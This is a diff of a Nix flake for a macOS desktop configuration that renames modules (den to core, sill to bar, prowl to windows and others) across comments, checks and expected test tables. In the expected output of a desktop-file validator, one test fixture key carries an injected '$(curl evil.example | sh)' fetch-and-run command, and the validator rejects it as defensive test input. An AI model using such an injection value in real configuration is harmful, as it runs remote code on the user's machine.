@@ -35,7 +35,7 @@
       inputs.nebelung.follows = "nebelung";
     };
 
-    # The notch file shelf. Its overlay puts `perch` in pkgs; modules/perch
+    # The notch file shelf. Its overlay puts `perch` in pkgs; modules/shelf
     # places the app at a fixed /Applications path. What gets BUILT is perch's
     # CI-built, notarized release ZIP (macOS 26 blocks a from-source Nix build —
     # see the perch repo), because perch's own flake pins that zip in
@@ -50,7 +50,7 @@
 
     # The agent-worktree substrate — a standalone Go binary, the rewrite of
     # the rice's old bash `wt.sh` (now retired entirely). Its overlay puts
-    # `holt` in pkgs, and den ships it on PATH as the only worktree-lifecycle
+    # `holt` in pkgs, and core ships it on PATH as the only worktree-lifecycle
     # CLI the rice knows.
     holt = {
       url = "github:hausfold/holt";
@@ -59,8 +59,8 @@
 
     # Terminal session persistence — attach/detach a PTY without a multiplexer,
     # because "windows, tabs and splits are the window manager's job" and this
-    # rice already has one (prowl). It is the backing store for
-    # `haus.hearth.lanes.backend = "zmx"`: a lane's agent lives in a zmx
+    # rice already has one (windows). It is the backing store for
+    # `haus.terminal.lanes.backend = "zmx"`: a lane's agent lives in a zmx
     # session, and a Ghostty window is only ever a view onto it. NO overlay of
     # its own — the flake exposes `packages.<system>.zmx` and nothing else — so
     # the builder below lifts it into pkgs by hand.
@@ -138,7 +138,7 @@
           specialArgs = { inherit inputs username hostname; };
           modules = [
             # The builder's `system` arg decides the platform (mkDefault so a
-            # host file can still override). Was hardcoded in den, which broke
+            # host file can still override). Was hardcoded in core, which broke
             # x86_64-darwin no matter what callers passed.
             { nixpkgs.hostPlatform = nixpkgs.lib.mkDefault system; }
             {
@@ -486,7 +486,7 @@
       ];
       # A public partial carries the whole declaration surface plus the shared
       # normalized roster/workspace foundation its implementation may consume.
-      # Den is the safe foundation; beyond it only the named room implementation
+      # Core is the safe foundation; beyond it only the named room implementation
       # is active. This is the current pre-Blank equivalent of “Blank + room”.
       standaloneModule =
         {
@@ -507,13 +507,13 @@
               ./modules/roster
               # The AI room's wiring. In the foundation rather than a room of its own
               # because it publishes the extension points the rooms below read
-              # (modules/lib/contrib.nix), and a partial that imported only `sill`
+              # (modules/lib/contrib.nix), and a partial that imported only `bar`
               # would otherwise draw its agents pill off an unwritten seam. What that
               # costs is honest and temporary: the room adds no packages, only
               # assertions and contributions, and step 3 of the rooms plan is what
               # decides whether Blank carries it.
               ./modules/ai
-              ./modules/den
+              ./modules/core
               implementation
             ];
         };
@@ -523,30 +523,30 @@
       # Named exports carry the declaration + shared-data foundation above;
       # they do not activate any other room implementation.
       darwinModules = {
-        den = standaloneModule { implementation = ./modules/den; };
-        hearth = standaloneModule {
-          implementation = ./modules/hearth;
+        core = standaloneModule { implementation = ./modules/core; };
+        terminal = standaloneModule {
+          implementation = ./modules/terminal;
           activation = { lib, ... }: { haus.developer.enable = lib.mkDefault true; };
         };
-        prowl = standaloneModule {
-          implementation = ./modules/prowl;
-          activation = { lib, ... }: { haus.prowl.enable = lib.mkDefault true; };
+        windows = standaloneModule {
+          implementation = ./modules/windows;
+          activation = { lib, ... }: { haus.windows.enable = lib.mkDefault true; };
         };
-        sill = standaloneModule {
-          implementation = ./modules/sill;
-          activation = { lib, ... }: { haus.sill.enable = lib.mkDefault true; };
+        bar = standaloneModule {
+          implementation = ./modules/bar;
+          activation = { lib, ... }: { haus.bar.enable = lib.mkDefault true; };
         };
-        collar = standaloneModule {
-          implementation = ./modules/collar;
-          activation = { lib, ... }: { haus.collar.enable = lib.mkDefault true; };
+        security = standaloneModule {
+          implementation = ./modules/security;
+          activation = { lib, ... }: { haus.security.touchId.enable = lib.mkDefault true; };
         };
-        pounce = standaloneModule {
-          implementation = ./modules/pounce;
-          activation = { lib, ... }: { haus.pounce.enable = lib.mkDefault true; };
+        launcher = standaloneModule {
+          implementation = ./modules/launcher;
+          activation = { lib, ... }: { haus.launcher.enable = lib.mkDefault true; };
         };
-        hush = standaloneModule {
-          implementation = ./modules/hush;
-          activation = { lib, ... }: { haus.hush.enable = lib.mkDefault true; };
+        focus = standaloneModule {
+          implementation = ./modules/focus;
+          activation = { lib, ... }: { haus.focus.enable = lib.mkDefault true; };
         };
         secrets = standaloneModule { implementation = ./modules/secrets; };
         default = ./modules;
@@ -1000,7 +1000,7 @@
           compatRows = map compatRow (builtins.attrNames compatPairs);
 
           # ---- editor-choice ---------------------------------------------------
-          # `haus.hearth.editorName` is the desktop-safe half of the editor pair
+          # `haus.terminal.editorName` is the desktop-safe half of the editor pair
           # (modules/lib/editors.nix). What makes it worth a check rather than a
           # type is that ONE assignment has to move four unrelated things at
           # once: the package that lands in the profile, $EDITOR/$VISUAL, the
@@ -1024,7 +1024,7 @@
           editorRow =
             name:
             let
-              full = editorHome [ { haus.hearth.editorName = name; } ];
+              full = editorHome [ { haus.terminal.editorName = name; } ];
               home = full.home-manager.users.you;
               hasPkg = want: builtins.any (p: (p.pname or "") == want) home.home.packages;
               installed = hasPkg name;
@@ -1043,8 +1043,8 @@
             let
               full = editorHome [
                 {
-                  haus.hearth.editorName = "neovim";
-                  haus.hearth.editor = "code -w";
+                  haus.terminal.editorName = "neovim";
+                  haus.terminal.editor = "code -w";
                 }
               ];
               home = full.home-manager.users.you;
@@ -1223,7 +1223,7 @@
             (keymapRow "alt-space" "ctrl-space" "ctrl-alt")
             (keymapRow "none" "none" "none")
             # Two keys, one chord. Silent in practice (whoever registers first
-            # wins), so prowl asserts on it — this pins that it's detected at all.
+            # wins), so windows asserts on it — this pins that it's detected at all.
             (keymapRow "alt-space" "alt-space" "cmd-alt")
           ];
           # ---- alert-volume ----------------------------------------------------
@@ -1268,11 +1268,11 @@
           # modules/lib/reachability.nix names which com.apple.universalaccess
           # keys are measured to actually take effect, and that one fact has to be
           # true in three places at once. Two are pinned by construction —
-          # modules/den/options.nix GENERATES haus.accessibility from the table
+          # modules/core/options.nix GENERATES haus.accessibility from the table
           # with `genAttrs` and throws in both directions if the descriptions and
           # the table disagree — so an option cannot drift from it silently.
           #
-          # The third can, and this is it. `classify_key` in modules/den/haus.sh
+          # The third can, and this is it. `classify_key` in modules/core/haus.sh
           # decides how `haus diff`/`haus plan` VERIFY a declared key, and its
           # `effective` arm is a hand-typed copy of the same names. A shell script
           # can't import a Nix table, so the copy is unavoidable; what's avoidable
@@ -1302,7 +1302,7 @@
             "effective"
             "by-eye"
           ];
-          a11yScriptLines = nixpkgs.lib.splitString "\n" (builtins.readFile ./modules/den/haus.sh);
+          a11yScriptLines = nixpkgs.lib.splitString "\n" (builtins.readFile ./modules/core/haus.sh);
           a11yTableKeysOf =
             class:
             nixpkgs.lib.sort (a: b: a < b) (
@@ -1340,7 +1340,7 @@
           # says so — it moves the handful of tools the rice injects an accent
           # hex into, and leaves the single-file dotfiles on their built-in
           # colour. Both halves of that sentence are a promise, and both fail
-          # SILENTLY: drop the accent wire from lazygit in a hearth refactor and
+          # SILENTLY: drop the accent wire from lazygit in a terminal refactor and
           # nothing errors, the accent just quietly stops arriving; wire it into
           # ghostty by accident and a documented boundary moves without anyone
           # deciding to move it. So the reach is pinned as a golden table.
@@ -1425,14 +1425,14 @@
               # dark/light pair macOS is showing — so the fingerprint that moves
               # here is the name inside config.json, not a colour.
               perch = hm.home.activation.perchTheme.data;
-              # The BAR, via its far-left logo pill only. sill's palette file is
+              # The BAR, via its far-left logo pill only. bar's palette file is
               # the whole nebelung palette and never moves with the accent (it is
-              # in the pinned half below, and stays there); haus.sill.logo.color
+              # in the pinned half below, and stays there); haus.bar.logo.color
               # left null resolves to the accent and lands here, so this is the
               # one bar file the accent reaches. Split out rather than folded
-              # into the `sill` row because the two answer different questions —
+              # into the `bar` row because the two answer different questions —
               # "did the palette change" and "did the accent choose a pill".
-              sill-logo = file ".config/sketchybar/logo_config.sh";
+              bar-logo = file ".config/sketchybar/logo_config.sh";
               # --- and is supposed to leave these alone ---
               bat = file "/Users/you/.config/bat/themes/Catppuccin Mocha.tmTheme";
               ghostty = file "Library/Application Support/com.mitchellh.ghostty/config";
@@ -1440,7 +1440,7 @@
               lsd = file ".config/lsd/colors.yaml";
               opencode = file ".config/opencode/themes/nebelung.json";
               pounce = file "/Users/you/.config/pounce/themes/nebelung.json";
-              sill = file ".config/sketchybar/colors.sh";
+              bar = file ".config/sketchybar/colors.sh";
               starship = file "/Users/you/.config/starship.toml";
               zellij = file ".config/zellij/themes/nebelung.kdl";
             };
@@ -1468,6 +1468,8 @@
           # Alphabetical because the rows are `attrNames` — self-sorting, so a new
           # surface can't be added in a spot that hides it. Ten move, nine hold.
           expectedAccentTable = ''
+            bar pinned
+            bar-logo moves
             bat pinned
             fzf moves
             ghostty pinned
@@ -1478,8 +1480,6 @@
             opencode pinned
             perch moves
             pounce pinned
-            sill pinned
-            sill-logo moves
             starship pinned
             stylus moves
             wallpaper moves
@@ -1494,8 +1494,8 @@
           # then shows up as a new row rather than going unnoticed in a curated
           # list. That only works while every file is a subject in its own right.
           #
-          # A DERIVED file is not. sill's `.haus-stamp` is a content hash over
-          # every other bar file (modules/sill/default.nix), so it moves whenever
+          # A DERIVED file is not. bar's `.haus-stamp` is a content hash over
+          # every other bar file (modules/bar/default.nix), so it moves whenever
           # any of them does — it would earn a row in both tables while measuring
           # nothing, and in every reach-style check written after this one. Named
           # by convention rather than by path so the next derived file inherits
@@ -1513,7 +1513,7 @@
           # fail silently:
           #
           #   1. it REACHES a specific set of surfaces (terminal type, the
-          #      palette, the bar's type, Dock tiles, prowl's gaps, Finder's
+          #      palette, the bar's type, Dock tiles, windows's gaps, Finder's
           #      sidebar). Drop one of those wires in a refactor and nothing
           #      errors — the surface just stops growing with the others, which
           #      is invisible to anyone not running at a scale;
@@ -1560,7 +1560,7 @@
                   if entry.text != null then entry.text else toString entry.source
                 );
               # The capture groups of the first line matching `pat`, joined with
-              # "/" — so the prowl rows can carry both monitors' gaps in one
+              # "/" — so the windows rows can carry both monitors' gaps in one
               # cell. Throws rather than emitting an empty cell if nothing
               # matches: a row whose subject vanished would otherwise keep
               # passing while measuring nothing.
@@ -1582,12 +1582,12 @@
               files = builtins.mapAttrs (target: _: text target) (reachFiles hm.home.file);
               numbers = {
                 # The ONE option in the whole surface whose unit is points —
-                # `ui.scale` and `pounce.scale` are multipliers, and the other
+                # `ui.scale` and `launcher.scale` are multipliers, and the other
                 # numeric leaves are ids, counts and a percentage.
                 "opt fonts.mono.size" = toString cfg.haus.fonts.mono.size;
-                "opt pounce.scale" = toString cfg.haus.pounce.scale;
+                "opt launcher.scale" = toString cfg.haus.launcher.scale;
                 # Deliberately unset at 1.0: a Dock sized by hand is left alone
-                # unless the rice was actually asked to scale (den/default.nix).
+                # unless the rice was actually asked to scale (core/default.nix).
                 "sys dock.tilesize" =
                   if cfg.system.defaults.dock.tilesize == null then
                     "unset"
@@ -1598,7 +1598,7 @@
                 "gen pounce scale" = capture ".config/pounce/config.json" ".*\"scale\":([0-9.]+).*";
                 # Bracket classes rather than backslashes: these are POSIX
                 # extended regexes, where an escaped brace is not a literal.
-                "gen prowl inner.horizontal" =
+                "gen windows inner.horizontal" =
                   capture aerospace ".*inner[.]horizontal = [[][{] monitor[.][^=]+= ([0-9]+) [}], ([0-9]+)[]].*";
                 # The bar's edge. The built-in is a scaled gap plus bar.room (the
                 # notch strip already excludes the bar's height there); the
@@ -1607,9 +1607,9 @@
                 # the room, the separation the pill couldn't take vertically once
                 # its type hit the ceiling. A number climbing with the scale here
                 # would be reserving a band for a bar that never got taller.
-                "gen prowl outer.top" =
+                "gen windows outer.top" =
                   capture aerospace ".*outer[.]top = [[][{] monitor[.][^=]+= ([0-9]+) [}], ([0-9]+)[]].*";
-                "gen sill FS_ICON" = capture ".config/sketchybar/sizes.sh" ".*FS_ICON=\"([0-9.]+)\".*";
+                "gen bar FS_ICON" = capture ".config/sketchybar/sizes.sh" ".*FS_ICON=\"([0-9.]+)\".*";
               };
             };
           # Four full evaluations, bound once — the rows are cheap, the systems
@@ -1650,7 +1650,7 @@
           scaleCell = run: target: run.files.${target} or "(absent)";
           # The UNION of every run's targets, not the 1.0 run's — a file written
           # only above 1.0 (`mkIf (ui.scale != 1.0)`, which is exactly how
-          # den writes the Dock tile) exists in no other run's attrNames, so
+          # core writes the Dock tile) exists in no other run's attrNames, so
           # taking the first run's would leave it out of the table entirely and
           # this check would go green on the surface it was built to notice.
           # Merging the attrsets keeps the names sorted; `scaleCell`'s fallback
@@ -1673,13 +1673,13 @@
           # all four scales. Both halves self-sort (`attrNames`), so nothing can
           # be added in a spot that hides it.
           expectedScaleTable = ''
+            gen bar FS_ICON 17.0 21.0 21.0 21.0
             gen ghostty font-size 19 27 48 57
             gen pounce scale 1.0 1.4 2.0 2.0
-            gen prowl inner.horizontal 10/20 14/28 25/50 30/60
-            gen prowl outer.top 10/36 24/46 35/46 40/46
-            gen sill FS_ICON 17.0 21.0 21.0 21.0
+            gen windows inner.horizontal 10/20 14/28 25/50 30/60
+            gen windows outer.top 10/36 24/46 35/46 40/46
             opt fonts.mono.size 19 27 48 57
-            opt pounce.scale 1.000000 1.400000 2.000000 2.000000
+            opt launcher.scale 1.000000 1.400000 2.000000 2.000000
             sys dock.tilesize unset 67 120 144
             sys finder.sidebar 1 3 3 3
             file .claude/skills/haus/references/this-machine.md moves
@@ -1704,15 +1704,15 @@
           # Two families rather than accent-reach's three: there is no ceiling
           # here and no partial-arrival case that a third value would catch. The
           # rows that matter most are the PINNED one — the workspace-logo glyphs
-          # are sketchybar-app-font, sill's own, and must not follow the rice —
+          # are sketchybar-app-font, bar's own, and must not follow the rice —
           # and the two halves of that sentence coming from the same generated
           # file.
           #
           # ★ And the second story, which is about this check rather than the
           # bar: A REACH TABLE THAT VARIES ONE OPTION IS BLIND TO ANYTHING BEHIND
           # A SECOND ONE. The clock pill's label has two branches
-          # (modules/sill/default.nix), and every system below leaves
-          # `sill.clock.monoFont` at its `true` default — so the other branch was
+          # (modules/bar/default.nix), and every system below leaves
+          # `bar.clock.monoFont` at its `true` default — so the other branch was
           # never evaluated here, and a hardcoded ".AppleSystemUIFont" landed in
           # it (#330) without this check noticing, which is the one check whose
           # entire job is finding hardcoded families. The literal was a day old
@@ -1761,9 +1761,9 @@
                   throw "font-reach: nothing in ${target} matches ${pat} — that row has no subject"
                 else
                   builtins.concatStringsSep "/" (builtins.head hits);
-              # Five pills in modules/sill/default.nix can write `label.font=`
-              # into this file once `sill.items` names them, so a first-hit
-              # capture would be measuring whichever one sill emits first. Today
+              # Five pills in modules/bar/default.nix can write `label.font=`
+              # into this file once `bar.items` names them, so a first-hit
+              # capture would be measuring whichever one bar emits first. Today
               # the anchor is NOT load-bearing — measured, by widening it to `.*`
               # and watching the row still pass — and for a weaker reason than
               # ordering: the example system does emit a second `label.font=`
@@ -1794,11 +1794,11 @@
               names = {
                 "gen ghostty font-family" =
                   capture "Library/Application Support/com.mitchellh.ghostty/config" ".*font-family = (.*)";
-                "gen sill BAR_FONT" = capture ".config/sketchybar/sizes.sh" ".*BAR_FONT=\"(.*)\".*";
-                "gen sill workspace letter" = capture ".config/sketchybar/workspaces.sh" ".*IFONT=\"([^:]+):Bold.*";
-                "gen sill workspace logo" =
+                "gen bar BAR_FONT" = capture ".config/sketchybar/sizes.sh" ".*BAR_FONT=\"(.*)\".*";
+                "gen bar workspace letter" = capture ".config/sketchybar/workspaces.sh" ".*IFONT=\"([^:]+):Bold.*";
+                "gen bar workspace logo" =
                   capture ".config/sketchybar/workspaces.sh" ".*IFONT=(sketchybar-app-font):Regular.*";
-                "gen sill clock label" =
+                "gen bar clock label" =
                   captureAfter ".config/sketchybar/top_items.sh" ".*--set clock.*"
                     ".*label\\.font=\"([^:]+):Bold.*";
               };
@@ -1810,9 +1810,9 @@
           # whatever family the rice names. So one more row, read straight off
           # the source: how many lines still name a font family literally. It is
           # 0, and the next hardcoded "Whatever Nerd Font:" makes it 1.
-          sillStaticHardcodedFonts =
+          barStaticHardcodedFonts =
             let
-              dir = ./modules/sill/sketchybar;
+              dir = ./modules/bar/sketchybar;
               plugins = builtins.attrNames (builtins.readDir (dir + "/plugins"));
               files = [ (dir + "/sketchybarrc") ] ++ map (f: dir + "/plugins" + "/${f}") plugins;
               lines = builtins.concatLists (map (f: nixpkgs.lib.splitString "\n" (builtins.readFile f)) files);
@@ -1827,7 +1827,7 @@
           sansAt =
             name:
             fontAt {
-              haus.sill.clock.monoFont = false;
+              haus.bar.clock.monoFont = false;
               haus.fonts.sans.name = name;
             };
           sansA = sansAt ".AppleSystemUIFont";
@@ -1859,23 +1859,23 @@
           # and the complete list of files a proportional family reaches. That
           # list being short IS the claim — `fonts.sans` is one label, and the
           # option's own description says so.
-          sansNameRow = "sans gen sill clock label ${sansA.names."gen sill clock label"} | ${
-            sansB.names."gen sill clock label"
+          sansNameRow = "sans gen bar clock label ${sansA.names."gen bar clock label"} | ${
+            sansB.names."gen bar clock label"
           }";
           fontTable = builtins.concatStringsSep "\n" (
             fontNameRows
-            ++ [ "static sill hardcoded-family-literals ${toString sillStaticHardcodedFonts}" ]
+            ++ [ "static bar hardcoded-family-literals ${toString barStaticHardcodedFonts}" ]
             ++ fontFileRows
             ++ [ sansNameRow ]
             ++ sansFileRows
           );
           expectedFontTable = ''
+            gen bar BAR_FONT JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
+            gen bar clock label JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
+            gen bar workspace letter JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
+            gen bar workspace logo sketchybar-app-font | sketchybar-app-font
             gen ghostty font-family JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
-            gen sill BAR_FONT JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
-            gen sill clock label JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
-            gen sill workspace letter JetBrainsMono Nerd Font Mono | FiraCode Nerd Font
-            gen sill workspace logo sketchybar-app-font | sketchybar-app-font
-            static sill hardcoded-family-literals 0
+            static bar hardcoded-family-literals 0
             file .claude/skills/haus/references/this-machine.md moves
             file .config/opencode/skills/haus/references/this-machine.md moves
             file .config/sketchybar/sizes.sh moves
@@ -1883,7 +1883,7 @@
             file .config/sketchybar/tour_item.sh moves
             file .config/sketchybar/workspaces.sh moves
             file Library/Application Support/com.mitchellh.ghostty/config moves
-            sans gen sill clock label .AppleSystemUIFont | Atkinson Hyperlegible
+            sans gen bar clock label .AppleSystemUIFont | Atkinson Hyperlegible
             sans file .config/sketchybar/top_items.sh moves
           '';
 
@@ -1952,20 +1952,20 @@
             # inert, not an error.
             "ai-alone" = [
               {
-                haus.sill.enable = false;
-                haus.pounce.enable = false;
-                haus.sill.items.agents = true;
+                haus.bar.enable = false;
+                haus.launcher.enable = false;
+                haus.bar.items.agents = true;
               }
             ];
             # One receiver at a time, to prove the contributions are independent
             # rather than all riding on one room being present.
             "ai-with-bar" = [
               {
-                haus.pounce.enable = false;
-                haus.sill.items.agents = true;
+                haus.launcher.enable = false;
+                haus.bar.items.agents = true;
               }
             ];
-            "ai-with-launcher" = [ { haus.sill.enable = false; } ];
+            "ai-with-launcher" = [ { haus.bar.enable = false; } ];
             # The room off, with every receiver present: the receivers keep their
             # own features and lose only what AI was contributing.
             "ai-off" = [ { haus.ai.enable = false; } ];
@@ -1975,7 +1975,7 @@
             "pill-without-ai" = [
               {
                 haus.ai.enable = false;
-                haus.sill.items.agents = true;
+                haus.bar.items.agents = true;
               }
             ];
             # The SECOND bar asking for the same pill. A separate fixture because
@@ -1986,8 +1986,8 @@
             "bottom-pill-without-ai" = [
               {
                 haus.ai.enable = false;
-                haus.sill.bottom.enable = true;
-                haus.sill.bottom.items.agents = "left";
+                haus.bar.bottom.enable = true;
+                haus.bar.bottom.items.agents = "left";
               }
             ];
             # The room on with NO client installed by the rice. `ai.clients`
@@ -1998,7 +1998,7 @@
             "no-rice-clients" = [
               {
                 haus.ai.clients = [ ];
-                haus.sill.items.agents = true;
+                haus.bar.items.agents = true;
               }
             ];
           };
@@ -2041,18 +2041,18 @@
             + "Nothing writes agent-pane state on this machine, so the pill would stay dormant "
             + "forever and the bar leaves it out.";
           aiPillWarnings = (aiRoomAt aiRoomFixtures."pill-without-ai").cfg.warnings;
-          expectedAiPillWarnings = [ (aiPillWarning "haus.sill.items.agents") ];
+          expectedAiPillWarnings = [ (aiPillWarning "haus.bar.items.agents") ];
           # The bottom bar's own row. Its warning list carries the pre-existing
           # empty-strip warning too — the second bar really does end up with
           # nothing on it — so both are asserted, in order, rather than filtered.
           aiBottomPillWarnings = (aiRoomAt aiRoomFixtures."bottom-pill-without-ai").cfg.warnings;
           expectedAiBottomPillWarnings = [
             (
-              "haus.sill.bottom.enable is on but no pill lands on the second bar — nothing in "
-              + "haus.sill.bottom.items, or the rooms behind the pills it names are off — so it "
+              "haus.bar.bottom.enable is on but no pill lands on the second bar — nothing in "
+              + "haus.bar.bottom.items, or the rooms behind the pills it names are off — so it "
               + "draws an empty strip and still reserves room at the bottom of every display."
             )
-            (aiPillWarning "haus.sill.bottom.items.agents")
+            (aiPillWarning "haus.bar.bottom.items.agents")
           ];
 
           # A standalone `darwinModules` import, as a consumer would make it:
@@ -2162,19 +2162,19 @@
           desktopReadback =
             cfg:
             "scale=${toString cfg.haus.ui.scale}"
-            + " sill=${if cfg.haus.sill.enable then "yes" else "no"}"
+            + " bar=${if cfg.haus.bar.enable then "yes" else "no"}"
             + " internal=${toString (cfg.haus.displays.internal.uiScale or "(unset)")}"
             + " list=${
-               if cfg.haus.pounce.autoQuit.exclude == null then
+               if cfg.haus.launcher.autoQuit.exclude == null then
                  "(unset)"
                else
-                 builtins.concatStringsSep "+" cfg.haus.pounce.autoQuit.exclude
+                 builtins.concatStringsSep "+" cfg.haus.launcher.autoQuit.exclude
              }"
             # Both halves of the editor pair. The desktop may only set the NAME,
             # so a row reading `neovim/nvim` is the derived command arriving
             # through the seam — and `helix/hx` everywhere else is the room's
             # own default, unmoved.
-            + " editor=${cfg.haus.hearth.editorName}/${cfg.haus.hearth.editor}"
+            + " editor=${cfg.haus.terminal.editorName}/${cfg.haus.terminal.editor}"
             + " desktop=${desktopSelection cfg}";
           desktopRows = {
             # The built-in from-scratch choice. It selects a desktop like every
@@ -2188,7 +2188,7 @@
             one-desktop = desktopConfig { desktop = desktopFixture "valid-sample.nix"; };
             # The same desktop, plus a host that disagrees — with a PLAIN
             # assignment, no `lib.mkForce`. This row is the whole priority
-            # ladder: 1.5 means the host won, and `sill=yes` means the rest of
+            # ladder: 1.5 means the host won, and `bar=yes` means the rest of
             # the desktop survived the override rather than being replaced by it.
             host-override = desktopConfig {
               desktop = desktopFixture "valid-sample.nix";
@@ -2201,7 +2201,7 @@
             # and discover the semantics afterwards.
             list-override = desktopConfig {
               desktop = desktopFixture "valid-sample.nix";
-              extraModules = [ { haus.pounce.autoQuit.exclude = [ "from-host" ]; } ];
+              extraModules = [ { haus.launcher.autoQuit.exclude = [ "from-host" ]; } ];
             };
             # The OTHER way to select one: by hand, through `extraModules`,
             # which is what a consumer composing their own does. `desktop = null`
@@ -2220,13 +2220,13 @@
             map (name: "${name} ${desktopReadback desktopRows.${name}}") (builtins.attrNames desktopRows)
           );
           expectedDesktopTable = ''
-            blank scale=1.000000 sill=no internal=(unset) list=(unset) editor=helix/hx desktop=desktops/blank.nix
-            builder-default scale=1.000000 sill=yes internal=(unset) list=(unset) editor=helix/hx desktop=desktops/hacker.nix
-            by-hand scale=1.100000 sill=no internal=(unset) list=(unset) editor=helix/hx desktop=test/desktops/valid-other.nix
-            host-override scale=1.500000 sill=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
-            list-override scale=1.350000 sill=yes internal=larger-text list=from-host editor=neovim/nvim desktop=test/desktops/valid-sample.nix
-            no-desktop scale=1.000000 sill=no internal=(unset) list=(unset) editor=helix/hx desktop=(none)
-            one-desktop scale=1.350000 sill=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
+            blank scale=1.000000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=desktops/blank.nix
+            builder-default scale=1.000000 bar=yes internal=(unset) list=(unset) editor=helix/hx desktop=desktops/hacker.nix
+            by-hand scale=1.100000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=test/desktops/valid-other.nix
+            host-override scale=1.500000 bar=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
+            list-override scale=1.350000 bar=yes internal=larger-text list=from-host editor=neovim/nvim desktop=test/desktops/valid-sample.nix
+            no-desktop scale=1.000000 bar=no internal=(unset) list=(unset) editor=helix/hx desktop=(none)
+            one-desktop scale=1.350000 bar=yes internal=larger-text list=from-desktop-a+from-desktop-b editor=neovim/nvim desktop=test/desktops/valid-sample.nix
           '';
 
           blankConfig = desktopRows.blank;
@@ -2237,16 +2237,16 @@
                 {
                   ai = blankConfig.haus.ai.enable || blankConfig.haus.ai.clients != [ ];
                   apps = blankConfig.haus.apps.videoPlayer.enable;
-                  collar = blankConfig.haus.collar.enable;
+                  security = blankConfig.haus.security.touchId.enable;
                   development = blankConfig.haus.developer.enable;
-                  focus = blankConfig.haus.hush.enable;
-                  launcher = blankConfig.haus.pounce.enable;
-                  shelf = blankConfig.haus.perch.enable;
-                  bar = blankConfig.haus.sill.enable;
+                  focus = blankConfig.haus.focus.enable;
+                  launcher = blankConfig.haus.launcher.enable;
+                  shelf = blankConfig.haus.shelf.enable;
+                  bar = blankConfig.haus.bar.enable;
                   themePorts = blankConfig.haus.theme.ports.enable;
                   tour = blankConfig.haus.tour.enable;
                   wallpaper = blankConfig.haus.wallpaper.style != "none";
-                  windows = blankConfig.haus.prowl.enable;
+                  windows = blankConfig.haus.windows.enable;
                 }
                 .${name}
               )
@@ -2254,7 +2254,7 @@
                 "ai"
                 "apps"
                 "bar"
-                "collar"
+                "security"
                 "development"
                 "focus"
                 "launcher"
@@ -2277,7 +2277,7 @@
           # broken: a standalone export selects no desktop and must keep
           # evaluating exactly that way — the bare foundation plus one room,
           # with none of hacker's opinions and nothing to select.
-          desktopStandalone = desktopSelection (standaloneSystem [ self.darwinModules.sill ]).config;
+          desktopStandalone = desktopSelection (standaloneSystem [ self.darwinModules.bar ]).config;
 
           # Two desktops. Not a type error and not a conflict — both files are
           # valid, and the module system would happily merge them — so the
@@ -2344,10 +2344,10 @@
             test/desktops/host-only-hardware.nix: haus.displays.37D8832A-2D66-02CA-B9F7-8F30A301B230 names a physical display, which is a fact about one machine — a desktop may only use the `internal` and `main` selectors
             test/desktops/host-only-identity.nix: haus.git.email is host-only — it belongs to a person or a machine, so a shared desktop may not set it
             test/desktops/host-only-package.nix: haus.fonts.mono.package is host-only — it belongs to a person or a machine, so a shared desktop may not set it
-            test/desktops/host-only-path.nix: haus.hearth.obsidianVaults is host-only — it belongs to a person or a machine, so a shared desktop may not set it
-            test/desktops/host-only-secret.nix: haus.hush.slack.tokenCommand is host-only — it belongs to a person or a machine, so a shared desktop may not set it
+            test/desktops/host-only-path.nix: haus.terminal.obsidianVaults is host-only — it belongs to a person or a machine, so a shared desktop may not set it
+            test/desktops/host-only-secret.nix: haus.focus.slack.tokenCommand is host-only — it belongs to a person or a machine, so a shared desktop may not set it
             test/desktops/host-only-secret.nix: haus.secrets.provider is host-only — it belongs to a person or a machine, so a shared desktop may not set it
-            test/desktops/host-only-signing.nix: haus.pounce.signingIdentity is host-only — it belongs to a person or a machine, so a shared desktop may not set it
+            test/desktops/host-only-signing.nix: haus.launcher.signingIdentity is host-only — it belongs to a person or a machine, so a shared desktop may not set it
             test/desktops/imports.nix: may not import modules — a desktop is one file's worth of values, and what it can reach has to be readable from that file alone
             test/desktops/internal-wiring.nix: haus._contrib is internal wiring between rooms, not a setting a desktop may write
             test/desktops/legacy-namespace.nix: spells the namespace the pre-rename way; a desktop is new enough to have no legacy spelling — write `haus`
@@ -2356,7 +2356,7 @@
             test/desktops/nixpkgs.nix: may not set `nixpkgs.*`
             test/desktops/non-attrset.nix: does not evaluate to a set of settings — a desktop is { haus = { … }; }
             test/desktops/priority-instruction.nix: haus.ui.scale may not carry a merge or priority instruction — a desktop states values, and the host is what outranks them
-            test/desktops/shell-in-free-key.nix: haus.sill.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks or newlines
+            test/desktops/shell-in-free-key.nix: haus.bar.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks or newlines
             test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
             test/desktops/unknown-option.nix: haus.theme.accentColour is not a haus option
           '';
@@ -2410,7 +2410,7 @@
             touch $out
           '';
 
-          # modules/pounce/item-grammar.nix is a copy of pounce's `ItemTarget`,
+          # modules/launcher/item-grammar.nix is a copy of pounce's `ItemTarget`,
           # and copies rot. This one rotted in the expensive direction: pounce
           # learned `shortcut:<uuid>` (pounce#80), the LOCK moved to it the same
           # day, and the layer went on asserting that a key its own daemon
@@ -2424,13 +2424,13 @@
           # asymmetry that let it drift for a day without anyone noticing.
           pounce-item-grammar =
             let
-              grammar = import ./modules/pounce/item-grammar.nix;
+              grammar = import ./modules/launcher/item-grammar.nix;
             in
             pkgs.runCommand "haus-pounce-item-grammar-ok" { } ''
               src=${pounce}/pkgs/pounce/ItemSettings.swift
               test -f "$src" || {
                 echo "pounce's ItemSettings.swift has moved — find ItemTarget and repoint" >&2
-                echo "this check. Do not delete it: modules/pounce/item-grammar.nix is a" >&2
+                echo "this check. Do not delete it: modules/launcher/item-grammar.nix is a" >&2
                 echo "copy of that enum, and this is the only thing that reads both." >&2
                 exit 1
               }
